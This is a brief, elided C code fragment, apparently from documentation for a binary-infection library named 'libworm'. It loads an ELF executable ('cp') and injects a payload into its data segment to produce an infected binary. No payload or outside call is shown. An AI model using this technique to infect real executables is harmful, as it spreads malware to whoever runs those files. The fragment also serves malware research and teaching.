...
int main() {
    ...
    if (bin_load_elf (&bin, "/home/ulexec/Desktop/cp", PROT_READ | PROT_WRITE, MAP_PRIVATE) == LIBWORM_ERROR) {
        fprintf (stderr, "bin_load_elf failed");
        return -1;
    }

    if ((inject_data_segment(bin, code, &infected_bin, false, &payload_offset)) == LIBWORM_ERROR) {
        fprintf(stderr, "inject_data_segment Failed\n");
        return -1;
    }
